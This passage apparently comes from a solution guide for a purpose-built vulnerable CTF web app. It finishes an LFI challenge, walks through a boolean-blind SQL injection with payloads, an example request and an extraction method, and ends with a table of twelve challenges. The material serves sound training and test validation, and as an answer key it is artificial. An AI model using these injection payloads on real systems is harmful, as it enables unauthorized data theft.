the only onboarding path this app offers — can never own an invoice and therefore can never reach
a working `/receipt` page, regardless of skill. I confirmed chaining challenge 06's IDOR doesn't
rescue this: viewing another customer's invoice via the IDOR does render the receipt links, but
clicking them as a non-owner correctly 404s (verified live). Every live verification of this
challenge in this document and the prior audit required using the seed-only demo customer's
credentials — something no real player has access to.

**ATTACK CHAIN:**
Recon (invoice detail page — reachable *only* as the invoice's owner, see discrepancy) →
Discovery (three receipt-style links, `?template=` visible in each URL) → Vulnerable
functionality (`path.resolve(receiptTemplatesDir, template)` with no containment check) →
Exploitation (relative traversal or absolute-path anchor to `internal-billing/notes.txt` — target
name itself is undiscoverable in-app) → Flag condition (flag unconditionally present in that file)

---

## 13 — Advanced SQL Injection

1. **Vulnerability class:** SQL Injection — **boolean-based blind**, numeric (unquoted) context.
   Deliberately different from challenge 02 (string-context, UNION-based).
2. **Intended difficulty:** Hard.
3. **Starting point:** "Track Order" in the public site nav — fully unauthenticated.
4. **Discovery/recon:** the order-number field silently accepts non-numeric input with no
   validation error, and the response only ever says "We found a matching order." or "No
   matching order found..." — never any row data, even on a real match.
5. **Vulnerable parameter:** `order_id` in `POST /company/track-order` — concatenated with **no
   quoting** (numeric context, unlike challenge 02's quoted-string context):
   ```sql
   SELECT o.id FROM orders o JOIN company_users u ON u.id = o.customer_id
    WHERE o.id = <order_id> AND u.email = '<email>' LIMIT 1
   ```
6. **Injection strategy — boolean-based blind, not UNION.** Because the response only ever
   reveals found/not-found and never echoes any column data, a `UNION SELECT` has nothing to
   attach itself to. The oracle is the two-state response itself.
7. **Determining schema/data — same self-service technique as challenge 02:** append
   ` OR (SELECT count(*) FROM <guessed_table>)>0 -- ` and observe found/not-found; enumerate via
   `information_schema.tables` the same way. Live-verified sanity checks:
   ```
   order_id=0 OR (1=1) --   → "We found a matching order."
   order_id=0 OR (1=2) --   → "No matching order found..."
   ```
8. **Exploitation methodology — full worked example.** The comment (`-- `) neutralizes the
   trailing `AND u.email = '...'` check (same comment-bypass idea as challenge 04), turning the
   response into one bit of a much larger extraction:
   ```
   order_id = 0 OR (SELECT substring(escalation_note,1,1) FROM support_escalations LIMIT 1)='I' --
   ```
   A full extraction script performs binary search per character using `ascii(substring(...))`
   comparisons rather than guessing one character at a time — this is exactly how I validated
   the challenge (see below).
9. **Example request:**
   ```
   POST /company/track-order HTTP/1.1
   Content-Type: application/x-www-form-urlencoded

   order_id=0 OR (SELECT ascii(substring(escalation_note,1,1)) FROM support_escalations LIMIT 1) > 77 -- &email=x
   ```
10. **How the intended challenge data is reached:** `support_escalations.escalation_note` —
    seeded once, never read by any legitimate route, reachable only via this injection.
11. **Successful exploitation looks like:** I ran a complete, self-contained boolean-blind
    extraction script against the live endpoint (binary search over `ascii(substring(...))` per
    character position, using only the found/not-found response — no direct database access) and
    it correctly recovered the full note text ending in the flag reference. This confirms the
    challenge is solvable exactly as intended, purely through the HTTP oracle.
12. **Flag location:** `support_escalations.escalation_note`, extractable only via the boolean
    oracle above.
13. **Expected flag identifier:** `FLAG_ADVANCED_SQLI`.
14. **Prerequisites/account state:** None — fully unauthenticated.
15. **Common mistakes / dead ends:** Trying a UNION-based approach out of habit from challenge
    02 — doesn't work here since no data is ever echoed; forgetting the space before `-- `;
    using string-context quoting (`order_id='...'`) — this parameter is numeric/unquoted, quoting
    it breaks the query differently than intended.
16. **Solvable without source/SSH/.env/DB access:** Yes — I independently confirmed the
    boundary too: running the identical injected SQL shape directly as the `company_app` role
    against `players` returns `permission denied for table players`, and the application folds
    that error into the same "not found" response as a genuine non-match — so the technique
    naturally can't be used to reach CTF-platform tables even if a player tried, without needing
    any extra application-level filtering.

**ATTACK CHAIN:**
Recon (Track Order form, silent non-numeric acceptance) → Discovery (found/not-found is the only
signal — UNION doesn't apply) → Vulnerable functionality (`order_id`, unquoted numeric
concatenation) → Exploitation (comment-bypass + boolean/binary-search extraction against
`support_escalations`) → Flag condition (character-by-character reconstruction of
`escalation_note` via the oracle)

---

## Final summary table

| # | Vulnerability | Entry Point | Key Parameter | Exploit Type | Flag Condition |
|---|---|---|---|---|---|
| 01 | Information Disclosure | `GET /company/debug/deploy-status-8f3a` | — (no params) | Direct unauthenticated request | Always present in `notes` field |
| 02 | SQL Injection | `GET /company/products/search` | `q` | UNION-based (string context) | Present in injected `internal_notes` row |
| 03 | Path Traversal | `GET /company/portal/documents/download` | `file` | Directory traversal (one-level sibling escape) | Always present in `protected/flag.txt` |
| 04 | Auth Bypass | `POST /company/portal/legacy-login` | `email` | SQLi comment-bypass, targeted | Present only on the specific victim's dashboard |
| 05 | Stored XSS | `POST /company/portal/support` | `message` | Unescaped output injection | Server-side `<script` detection at creation time |
| 06 | IDOR | `GET /company/portal/invoices/:id` | `id` (path) | Missing ownership check | Present when target invoice has a non-null memo |
| 07 | JWT Weakness | `GET /company/api/internal/diagnostics` | `Authorization` header (JWT) | `alg:none` signature-bypass forgery | Forged `scope:"admin:internal"` accepted |
| 08 | Business Logic | `POST /company/portal/rewards/redeem` | `points` | Missing lower-bound validation (negative abuse) | Balance crosses 100,000 |
| 09 | CSRF | `GET /company/portal/settings/quick-unsubscribe` | — (no token) | Unprotected state-changing GET | `notification_pref_source = 'email_link'` |
| 10 | Unrestricted File Upload | `POST /company/portal/profile/avatar` | multipart `avatar` (`Content-Type`) | Declared-type/content mismatch | Magic-byte check fails post-upload |
| 11 | LFI | `GET /company/portal/invoices/:id/receipt` | `template` | `path.resolve()` absolute-path anchor / traversal | Always present in `internal-billing/notes.txt` |
| 13 | Advanced SQLi | `POST /company/track-order` | `order_id` | Boolean-based blind (numeric context) | Extractable via found/not-found oracle |

No application changes were made while producing this document. STOP.
